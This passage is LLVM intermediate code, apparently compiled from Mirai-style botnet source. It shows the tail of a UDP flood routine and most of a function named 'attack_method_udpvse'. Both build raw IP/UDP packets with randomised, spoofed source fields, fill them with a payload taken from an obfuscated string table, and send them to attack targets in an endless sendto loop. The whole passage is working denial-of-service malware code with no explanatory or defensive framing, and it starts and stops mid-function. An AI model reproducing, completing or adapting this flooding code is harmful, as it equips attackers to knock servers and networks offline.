  store %struct.iphdr* %101, %struct.iphdr** %21, align 8
  %102 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %103 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %102, i64 1
  %104 = bitcast %struct.iphdr* %103 to %struct.udphdr*
  store %struct.udphdr* %104, %struct.udphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %106 = bitcast %struct.iphdr* %105 to i8*
  %107 = load i8, i8* %106, align 4
  %108 = and i8 %107, 15
  %109 = or i8 %108, 64
  store i8 %109, i8* %106, align 4
  %110 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %111 = bitcast %struct.iphdr* %110 to i8*
  %112 = load i8, i8* %111, align 4
  %113 = and i8 %112, -16
  %114 = or i8 %113, 5
  store i8 %114, i8* %111, align 4
  %115 = load i8, i8* %12, align 1
  %116 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i32 0, i32 1
  store i8 %115, i8* %117, align 1
  %118 = load i16, i16* %18, align 2
  %119 = zext i16 %118 to i64
  %120 = add i64 28, %119
  %121 = trunc i64 %120 to i16
  %122 = call zeroext i16 @htons(i16 noundef zeroext %121) #8
  %123 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %124 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %123, i32 0, i32 2
  store i16 %122, i16* %124, align 2
  %125 = load i16, i16* %13, align 2
  %126 = call zeroext i16 @htons(i16 noundef zeroext %125) #8
  %127 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 3
  store i16 %126, i16* %128, align 4
  %129 = load i8, i8* %14, align 1
  %130 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %131 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %130, i32 0, i32 5
  store i8 %129, i8* %131, align 4
  %132 = load i8, i8* %15, align 1
  %133 = icmp ne i8 %132, 0
  br i1 %133, label %134, label %138

134:                                              ; preds = %90
  %135 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %136 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 4
  store i16 %135, i16* %137, align 2
  br label %138

138:                                              ; preds = %134, %90
  %139 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 6
  store i8 17, i8* %140, align 1
  %141 = load i32, i32* %20, align 4
  %142 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 8
  store i32 %141, i32* %143, align 4
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 1
  %149 = load i32, i32* %148, align 4
  %150 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 9
  store i32 %149, i32* %151, align 4
  %152 = load i16, i16* %16, align 2
  %153 = call zeroext i16 @htons(i16 noundef zeroext %152) #8
  %154 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %155 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %154, i32 0, i32 0
  store i16 %153, i16* %155, align 2
  %156 = load i16, i16* %17, align 2
  %157 = call zeroext i16 @htons(i16 noundef zeroext %156) #8
  %158 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %159 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %158, i32 0, i32 1
  store i16 %157, i16* %159, align 2
  %160 = load i16, i16* %18, align 2
  %161 = zext i16 %160 to i64
  %162 = add i64 8, %161
  %163 = trunc i64 %162 to i16
  %164 = call zeroext i16 @htons(i16 noundef zeroext %163) #8
  %165 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %166 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %165, i32 0, i32 2
  store i16 %164, i16* %166, align 2
  br label %167

167:                                              ; preds = %138
  %168 = load i32, i32* %9, align 4
  %169 = add nsw i32 %168, 1
  store i32 %169, i32* %9, align 4
  br label %85, !llvm.loop !27

170:                                              ; preds = %85
  br label %171

171:                                              ; preds = %311, %170
  store i32 0, i32* %9, align 4
  br label %172

172:                                              ; preds = %308, %171
  %173 = load i32, i32* %9, align 4
  %174 = load i8, i8* %5, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp slt i32 %173, %175
  br i1 %176, label %177, label %311

177:                                              ; preds = %172
  %178 = load i8**, i8*** %11, align 8
  %179 = load i32, i32* %9, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds i8*, i8** %178, i64 %180
  %182 = load i8*, i8** %181, align 8
  store i8* %182, i8** %23, align 8
  %183 = load i8*, i8** %23, align 8
  %184 = bitcast i8* %183 to %struct.iphdr*
  store %struct.iphdr* %184, %struct.iphdr** %24, align 8
  %185 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i64 1
  %187 = bitcast %struct.iphdr* %186 to %struct.udphdr*
  store %struct.udphdr* %187, %struct.udphdr** %25, align 8
  %188 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %189 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %188, i64 1
  %190 = bitcast %struct.udphdr* %189 to i8*
  store i8* %190, i8** %26, align 8
  %191 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %192 = load i32, i32* %9, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %191, i64 %193
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i32 0, i32 2
  %196 = load i8, i8* %195, align 4
  %197 = zext i8 %196 to i32
  %198 = icmp slt i32 %197, 32
  br i1 %198, label %199, label %220

199:                                              ; preds = %177
  %200 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %201 = load i32, i32* %9, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i64 %202
  %204 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %203, i32 0, i32 1
  %205 = load i32, i32* %204, align 4
  %206 = call i32 @ntohl(i32 noundef %205) #8
  %207 = call i32 @rand_next()
  %208 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %209 = load i32, i32* %9, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i64 %210
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i32 0, i32 2
  %213 = load i8, i8* %212, align 4
  %214 = zext i8 %213 to i32
  %215 = lshr i32 %207, %214
  %216 = add i32 %206, %215
  %217 = call i32 @htonl(i32 noundef %216) #8
  %218 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 9
  store i32 %217, i32* %219, align 4
  br label %220

220:                                              ; preds = %199, %177
  %221 = load i32, i32* %20, align 4
  %222 = icmp eq i32 %221, -1
  br i1 %222, label %223, label %227

223:                                              ; preds = %220
  %224 = call i32 @rand_next()
  %225 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 8
  store i32 %224, i32* %226, align 4
  br label %227

227:                                              ; preds = %223, %220
  %228 = load i16, i16* %13, align 2
  %229 = zext i16 %228 to i32
  %230 = icmp eq i32 %229, 65535
  br i1 %230, label %231, label %236

231:                                              ; preds = %227
  %232 = call i32 @rand_next()
  %233 = trunc i32 %232 to i16
  %234 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 3
  store i16 %233, i16* %235, align 4
  br label %236

236:                                              ; preds = %231, %227
  %237 = load i16, i16* %16, align 2
  %238 = zext i16 %237 to i32
  %239 = icmp eq i32 %238, 65535
  br i1 %239, label %240, label %245

240:                                              ; preds = %236
  %241 = call i32 @rand_next()
  %242 = trunc i32 %241 to i16
  %243 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %244 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %243, i32 0, i32 0
  store i16 %242, i16* %244, align 2
  br label %245

245:                                              ; preds = %240, %236
  %246 = load i16, i16* %17, align 2
  %247 = zext i16 %246 to i32
  %248 = icmp eq i32 %247, 65535
  br i1 %248, label %249, label %254

249:                                              ; preds = %245
  %250 = call i32 @rand_next()
  %251 = trunc i32 %250 to i16
  %252 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %253 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %252, i32 0, i32 1
  store i16 %251, i16* %253, align 2
  br label %254

254:                                              ; preds = %249, %245
  %255 = load i8, i8* %19, align 1
  %256 = icmp ne i8 %255, 0
  br i1 %256, label %257, label %261

257:                                              ; preds = %254
  %258 = load i8*, i8** %26, align 8
  %259 = load i16, i16* %18, align 2
  %260 = zext i16 %259 to i32
  call void @rand_str(i8* noundef %258, i32 noundef %260)
  br label %261

261:                                              ; preds = %257, %254
  %262 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i32 0, i32 7
  store i16 0, i16* %263, align 2
  %264 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %265 = bitcast %struct.iphdr* %264 to i16*
  %266 = call zeroext i16 @checksum_generic(i16* noundef %265, i32 noundef 20)
  %267 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 7
  store i16 %266, i16* %268, align 2
  %269 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %270 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %269, i32 0, i32 3
  store i16 0, i16* %270, align 2
  %271 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %272 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %273 = bitcast %struct.udphdr* %272 to i8*
  %274 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %275 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %274, i32 0, i32 2
  %276 = load i16, i16* %275, align 2
  %277 = load i16, i16* %18, align 2
  %278 = zext i16 %277 to i64
  %279 = add i64 8, %278
  %280 = trunc i64 %279 to i32
  %281 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %271, i8* noundef %273, i16 noundef zeroext %276, i32 noundef %280)
  %282 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %283 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %282, i32 0, i32 3
  store i16 %281, i16* %283, align 2
  %284 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %285 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %284, i32 0, i32 1
  %286 = load i16, i16* %285, align 2
  %287 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %288 = load i32, i32* %9, align 4
  %289 = sext i32 %288 to i64
  %290 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %287, i64 %289
  %291 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %290, i32 0, i32 0
  %292 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %291, i32 0, i32 1
  store i16 %286, i16* %292, align 2
  %293 = load i32, i32* %10, align 4
  %294 = load i8*, i8** %23, align 8
  %295 = load i16, i16* %18, align 2
  %296 = zext i16 %295 to i64
  %297 = add i64 28, %296
  %298 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %299 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %300 = load i32, i32* %9, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %299, i64 %301
  %303 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i32 0, i32 0
  %304 = bitcast %struct.sockaddr_in* %303 to %struct.sockaddr*
  store %struct.sockaddr* %304, %struct.sockaddr** %298, align 8
  %305 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %306 = load %struct.sockaddr*, %struct.sockaddr** %305, align 8
  %307 = call i64 @sendto(i32 noundef %293, i8* noundef %294, i64 noundef %297, i32 noundef 16384, %struct.sockaddr* %306, i32 noundef 16)
  br label %308

308:                                              ; preds = %261
  %309 = load i32, i32* %9, align 4
  %310 = add nsw i32 %309, 1
  store i32 %310, i32* %9, align 4
  br label %172, !llvm.loop !28

311:                                              ; preds = %172
  br label %171

312:                                              ; preds = %81, %75
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_udpvse(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 noundef %28, i64 noundef 8) #7
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 noundef zeroext %31, %struct.attack_option* noundef %32, i8 noundef zeroext 2, i32 noundef 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 noundef zeroext %35, %struct.attack_option* noundef %36, i8 noundef zeroext 3, i32 noundef 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 noundef zeroext %39, %struct.attack_option* noundef %40, i8 noundef zeroext 4, i32 noundef 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 noundef zeroext %43, %struct.attack_option* noundef %44, i8 noundef zeroext 5, i32 noundef 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 noundef zeroext %47, %struct.attack_option* noundef %48, i8 noundef zeroext 6, i32 noundef 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 noundef zeroext %51, %struct.attack_option* noundef %52, i8 noundef zeroext 7, i32 noundef 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 noundef zeroext 20)
  %55 = call i8* @table_retrieve_val(i32 noundef 20, i32* noundef %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 17) #7
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

58:                                               ; preds = %4
  br label %288

59:                                               ; preds = %4
  store i32 1, i32* %9, align 4
  %60 = load i32, i32* %10, align 4
  %61 = bitcast i32* %9 to i8*
  %62 = call i32 @setsockopt(i32 noundef %60, i32 noundef 0, i32 noundef 3, i8* noundef %61, i32 noundef 4) #7
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %67

64:                                               ; preds = %59
  %65 = load i32, i32* %10, align 4
  %66 = call i32 @close(i32 noundef %65)
  br label %288

67:                                               ; preds = %59
  store i32 0, i32* %9, align 4
  br label %68

68:                                               ; preds = %160, %67
  %69 = load i32, i32* %9, align 4
  %70 = load i8, i8* %5, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %163

73:                                               ; preds = %68
  %74 = call noalias i8* @calloc(i64 noundef 128, i64 noundef 1) #7
  %75 = load i8**, i8*** %11, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i8**, i8*** %11, align 8
  %80 = load i32, i32* %9, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8*, i8** %79, i64 %81
  %83 = load i8*, i8** %82, align 8
  %84 = bitcast i8* %83 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %20, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i64 1
  %87 = bitcast %struct.iphdr* %86 to %struct.udphdr*
  store %struct.udphdr* %87, %struct.udphdr** %21, align 8
  %88 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %89 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %88, i64 1
  %90 = bitcast %struct.udphdr* %89 to i8*
  store i8* %90, i8** %22, align 8
  %91 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %92 = bitcast %struct.iphdr* %91 to i8*
  %93 = load i8, i8* %92, align 4
  %94 = and i8 %93, 15
  %95 = or i8 %94, 64
  store i8 %95, i8* %92, align 4
  %96 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %97 = bitcast %struct.iphdr* %96 to i8*
  %98 = load i8, i8* %97, align 4
  %99 = and i8 %98, -16
  %100 = or i8 %99, 5
  store i8 %100, i8* %97, align 4
  %101 = load i8, i8* %12, align 1
  %102 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %103 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %102, i32 0, i32 1
  store i8 %101, i8* %103, align 1
  %104 = load i32, i32* %19, align 4
  %105 = sext i32 %104 to i64
  %106 = add i64 32, %105
  %107 = trunc i64 %106 to i16
  %108 = call zeroext i16 @htons(i16 noundef zeroext %107) #8
  %109 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %110 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %109, i32 0, i32 2
  store i16 %108, i16* %110, align 2
  %111 = load i16, i16* %13, align 2
  %112 = call zeroext i16 @htons(i16 noundef zeroext %111) #8
  %113 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i32 0, i32 3
  store i16 %112, i16* %114, align 4
  %115 = load i8, i8* %14, align 1
  %116 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i32 0, i32 5
  store i8 %115, i8* %117, align 4
  %118 = load i8, i8* %15, align 1
  %119 = icmp ne i8 %118, 0
  br i1 %119, label %120, label %124

120:                                              ; preds = %73
  %121 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %122 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i32 0, i32 4
  store i16 %121, i16* %123, align 2
  br label %124

124:                                              ; preds = %120, %73
  %125 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i32 0, i32 6
  store i8 17, i8* %126, align 1
  %127 = load i32, i32* @LOCAL_ADDR, align 4
  %128 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 8
  store i32 %127, i32* %129, align 4
  %130 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %131 = load i32, i32* %9, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %130, i64 %132
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %133, i32 0, i32 1
  %135 = load i32, i32* %134, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 9
  store i32 %135, i32* %137, align 4
  %138 = load i16, i16* %16, align 2
  %139 = call zeroext i16 @htons(i16 noundef zeroext %138) #8
  %140 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %141 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %140, i32 0, i32 0
  store i16 %139, i16* %141, align 2
  %142 = load i16, i16* %17, align 2
  %143 = call zeroext i16 @htons(i16 noundef zeroext %142) #8
  %144 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %145 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %144, i32 0, i32 1
  store i16 %143, i16* %145, align 2
  %146 = load i32, i32* %19, align 4
  %147 = sext i32 %146 to i64
  %148 = add i64 12, %147
  %149 = trunc i64 %148 to i16
  %150 = call zeroext i16 @htons(i16 noundef zeroext %149) #8
  %151 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %152 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %151, i32 0, i32 2
  store i16 %150, i16* %152, align 2
  %153 = load i8*, i8** %22, align 8
  %154 = bitcast i8* %153 to i32*
  store i32 -1, i32* %154, align 4
  %155 = load i8*, i8** %22, align 8
  %156 = getelementptr inbounds i8, i8* %155, i64 4
  store i8* %156, i8** %22, align 8
  %157 = load i8*, i8** %22, align 8
  %158 = load i8*, i8** %18, align 8
  %159 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* noundef %157, i8* noundef %158, i32 noundef %159)
  br label %160

160:                                              ; preds = %124
  %161 = load i32, i32* %9, align 4
  %162 = add nsw i32 %161, 1
  store i32 %162, i32* %9, align 4
  br label %68, !llvm.loop !29

163:                                              ; preds = %68
  br label %164

164:                                              ; preds = %287, %163
  store i32 0, i32* %9, align 4
  br label %165

165:                                              ; preds = %284, %164
  %166 = load i32, i32* %9, align 4
  %167 = load i8, i8* %5, align 1
  %168 = zext i8 %167 to i32
  %169 = icmp slt i32 %166, %168
  br i1 %169, label %170, label %287

170:                                              ; preds = %165
  %171 = load i8**, i8*** %11, align 8
  %172 = load i32, i32* %9, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds i8*, i8** %171, i64 %173
  %175 = load i8*, i8** %174, align 8
  store i8* %175, i8** %23, align 8
  %176 = load i8*, i8** %23, align 8
  %177 = bitcast i8* %176 to %struct.iphdr*
  store %struct.iphdr* %177, %struct.iphdr** %24, align 8
  %178 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i64 1
  %180 = bitcast %struct.iphdr* %179 to %struct.udphdr*
  store %struct.udphdr* %180, %struct.udphdr** %25, align 8
  %181 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i64 %183
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i32 0, i32 2
  %186 = load i8, i8* %185, align 4
  %187 = zext i8 %186 to i32
  %188 = icmp slt i32 %187, 32
  br i1 %188, label %189, label %210

189:                                              ; preds = %170
  %190 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %191 = load i32, i32* %9, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i64 %192
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i32 0, i32 1
  %195 = load i32, i32* %194, align 4
  %196 = call i32 @ntohl(i32 noundef %195) #8
  %197 = call i32 @rand_next()
  %198 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 2
  %203 = load i8, i8* %202, align 4
  %204 = zext i8 %203 to i32
  %205 = lshr i32 %197, %204
  %206 = add i32 %196, %205
  %207 = call i32 @htonl(i32 noundef %206) #8
  %208 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 9
  store i32 %207, i32* %209, align 4
  br label %210

210:                                              ; preds = %189, %170
  %211 = load i16, i16* %13, align 2
  %212 = zext i16 %211 to i32
  %213 = icmp eq i32 %212, 65535
  br i1 %213, label %214, label %219

214:                                              ; preds = %210
  %215 = call i32 @rand_next()
  %216 = trunc i32 %215 to i16
  %217 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 3
  store i16 %216, i16* %218, align 4
  br label %219

219:                                              ; preds = %214, %210
  %220 = load i16, i16* %16, align 2
  %221 = zext i16 %220 to i32
  %222 = icmp eq i32 %221, 65535
  br i1 %222, label %223, label %228

223:                                              ; preds = %219
  %224 = call i32 @rand_next()
  %225 = trunc i32 %224 to i16
  %226 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %227 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %226, i32 0, i32 0
  store i16 %225, i16* %227, align 2
  br label %228

228:                                              ; preds = %223, %219
  %229 = load i16, i16* %17, align 2
  %230 = zext i16 %229 to i32
  %231 = icmp eq i32 %230, 65535
  br i1 %231, label %232, label %237

232:                                              ; preds = %228
  %233 = call i32 @rand_next()
  %234 = trunc i32 %233 to i16
  %235 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 1
  store i16 %234, i16* %236, align 2
  br label %237

237:                                              ; preds = %232, %228
  %238 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %239 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %238, i32 0, i32 7
  store i16 0, i16* %239, align 2
  %240 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %241 = bitcast %struct.iphdr* %240 to i16*
  %242 = call zeroext i16 @checksum_generic(i16* noundef %241, i32 noundef 20)
  %243 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %244 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %243, i32 0, i32 7
  store i16 %242, i16* %244, align 2
  %245 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %246 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %245, i32 0, i32 3
  store i16 0, i16* %246, align 2
  %247 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %248 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %249 = bitcast %struct.udphdr* %248 to i8*
  %250 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 2
  %252 = load i16, i16* %251, align 2
  %253 = load i32, i32* %19, align 4
  %254 = sext i32 %253 to i64
  %255 = add i64 12, %254
  %256 = trunc i64 %255 to i32
  %257 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %247, i8* noundef %249, i16 noundef zeroext %252, i32 noundef %256)
  %258 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %259 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %258, i32 0, i32 3
  store i16 %257, i16* %259, align 2
  %260 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %261 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %260, i32 0, i32 1
  %262 = load i16, i16* %261, align 2
  %263 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %264 = load i32, i32* %9, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %263, i64 %265
  %267 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %266, i32 0, i32 0
  %268 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %267, i32 0, i32 1
  store i16 %262, i16* %268, align 2
  %269 = load i32, i32* %10, align 4
  %270 = load i8*, i8** %23, align 8
  %271 = load i32, i32* %19, align 4
  %272 = sext i32 %271 to i64
  %273 = add i64 32, %272
  %274 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
